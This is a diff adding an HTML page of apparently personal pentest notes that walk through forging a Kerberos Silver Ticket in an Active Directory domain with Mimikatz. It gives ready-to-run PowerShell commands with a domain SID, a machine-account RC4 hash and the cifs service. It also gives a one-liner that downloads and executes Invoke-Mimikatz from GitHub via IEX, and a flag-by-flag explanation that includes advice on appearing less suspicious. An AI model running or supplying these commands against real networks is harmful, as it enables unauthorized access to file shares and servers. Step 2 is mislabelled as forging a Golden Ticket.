@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <title>Forge Silver Ticket</title>
+    <meta name="generator" content="CherryTree" />
+    <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+  </head>
+
+  <body>
+    <div class="page">
+      <h1 class="title">Forge Silver Ticket</h1>
+      <br /><strong>Github Mimikatz powershell</strong>:
+      <a
+        href="https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1" target="_blank"
+        >https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1</a
+      ><br /><br /><strong>1. Retrieve the SID value of the domain</strong
+      ><br />we need it to build the Silver Ticket<br />
+      <div class="codebox">
+        <div class="codebox">
+          PS&gt;&nbsp;get-ADdomain&nbsp;DANIELE.local<br />PS&gt;&nbsp;wmic&nbsp;useraccount&nbsp;list&nbsp;brief&nbsp;&nbsp;&nbsp;#alternative
+        </div>
+      </div>
+      <br />
+      <a href=""><img src="images/1148-1.png" alt="images/1148-1.png" /></a
+      ><br />
+      <br /><strong>2. Forge the Golden Ticket</strong><br />This command can be
+      executed on any machine<br />
+      <div class="codebox">
+        <div class="codebox">
+          PS&gt;&nbsp;.&nbsp;.\Invoke-Mimikatz.ps1&nbsp;&nbsp;&nbsp;#load&nbsp;powershell&nbsp;script<br />PS&gt;&nbsp;Invoke-Mimikatz&nbsp;-Command&nbsp;&#39;&quot;kerberos::golden&nbsp;/user:Administrator&nbsp;/domain:DANIELE.local&nbsp;/target:TESTDC.DANIELE.local&nbsp;/sid:S-1-5-21-2492168702-2322743348-3414347950&nbsp;/rc4:be680d0eb8d8c44bfefaaecb69515b9d&nbsp;/startoffset:0&nbsp;/endin:600&nbsp;/renewmax:10080&nbsp;/service:cifs&nbsp;/ptt&quot;&#39;<br />PS&gt;&nbsp;Invoke-Mimikatz&nbsp;-Command&nbsp;&#39;&quot;kerberos::list&quot;&#39;
+        </div>
+      </div>
+      <br />
+      <a href=""><img src="images/1148-2.png" alt="images/1148-2.png" /></a
+      ><br />
+      <a href=""><img src="images/1148-3.png" alt="images/1148-3.png" /></a
+      ><br />
+      <code>kerberos::golden </code>→ Name of the module. There is not a Silver
+      module!<br />
+      <code>/user:Administrator</code> → Username for which the TGT is
+      generated, if we use a revoked/non-existing account is more suspicious
+      <br />
+      <code>/domain:</code> → Domain FQDN<br />
+      <code>/target:</code> → Target server FQDN. This is formed by
+      &lt;hostname&gt;.&lt;domain&gt;. For example testdc.daniele.local<br />
+      <a href=""><img src="images/1148-4.png" alt="images/1148-4.png" /></a
+      ><br />
+      <em><code>/sid</code></em
+      >: → SID of the domain<br />
+      <em><code>/service:</code></em> → SPN of the Service for which we want
+      create the Silver ticket. For example with “cifs” we can access to the
+      Windows File Share of the Target machine<br />
+      <em><code>/id:</code></em> → Optional. It is the User ID or RID. Attention
+      if we insert it it must coincide with the corespondent Service. <br />
+      example: In the example above for the Service CIFS on that machine its
+      User ID is 1001<br />
+      <code>/rc4:</code><em> </em>→ NT Hash(RC4) of the Computer account. Use
+      /aes128 and /aes256 for using AES keys <em><br /> </em
+      ><em><code>/startoffset:0</code></em> → Optional. When the Ticket is
+      available in minutes(default is 0 that means &quot;right now&quot;) .
+      <br />
+      ▪ Use negative numbers for a ticket available from past <br />
+      ▪ Use large number for the future<br />
+      <code>/endin</code>: → Optional. Ticket lifetime in minutes(default is 10
+      years). The default setting in Mimikatz is 10 hours==600 minutes<br />
+      <code>/renewmax</code>: → Optional. Ticket lifetime for renewal(default is
+      10 yeas). The default setting in Mimikatz is 7 days==10080 minutes<br />
+      <code>/ptt</code> or <code>/ticket</code> → It is not possible use both at
+      the same time<br />
+      ▪ /ptt inject the ticket in current Powershell process, no need to save
+      the ticket on disk<br />
+      ▪ /ticket save the ticket to a file for later use <br />
+      <br />The one line Powershell for it is:<em><br /></em>
+      <div class="codebox">
+        <div class="codebox">
+          PS&gt;&nbsp;IEX&nbsp;(New-Object&nbsp;Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1&quot;);Invoke-Mimikatz&nbsp;-Command&nbsp;&#39;&quot;kerberos::golden&nbsp;/user:Administrator&nbsp;/domain:DANIELE.local&nbsp;/target:TESTDC.DANIELE.local&nbsp;/sid:S-1-5-21-2492168702-2322743348-3414347950&nbsp;/rc4:be680d0eb8d8c44bfefaaecb69515b9d&nbsp;/id:1001&nbsp;/startoffset:0&nbsp;/endin:600&nbsp;/renewmax:10080&nbsp;/service:cifs&nbsp;/ptt&quot;&#39;;Invoke-Mimikatz&nbsp;-Command&nbsp;&#39;&quot;kerberos::list&quot;&#39;
+        </div>
+      </div>
+      <br />Initially this PS script should give some error about some “<span
+        style="color: #ff0000"
+        >variables that cannot be retrieved because not been set</span
+      >” but at the end should work<br /><br /><br />
+    </div>
+  </body>
+</html>
